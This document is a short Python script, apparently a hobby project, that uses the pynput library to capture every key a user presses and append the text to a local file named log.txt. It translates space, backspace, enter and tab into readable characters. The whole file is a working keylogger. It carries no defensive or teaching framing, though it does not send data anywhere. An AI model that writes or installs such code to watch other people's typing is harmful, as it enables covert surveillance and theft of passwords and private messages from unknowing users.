import pynput

from pynput.keyboard import Listener

logs = []
count = 0


def keyPress(key):
    global logs, count
    logs.append(key)
    count += 1
    # after how many key stocks the log will updated
    if count > 1:
        wirteFile(logs)
        count = 0
        logs = []


def keyRelease(key):
    pass


def wirteFile(logs):
    with open("log.txt", "a") as f:
        for log in logs:
            k = str(log).replace("'", "")
            if k.find("Key.space") >= 0:
                f.write(" ")
            elif k.find("Key.backspace") >= 0:
                f.write("<-")
            elif k.find("Key.enter") >= 0 or k.find("Key.tab") >= 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=keyPress, on_release=keyRelease) as listener:
    listener.join()
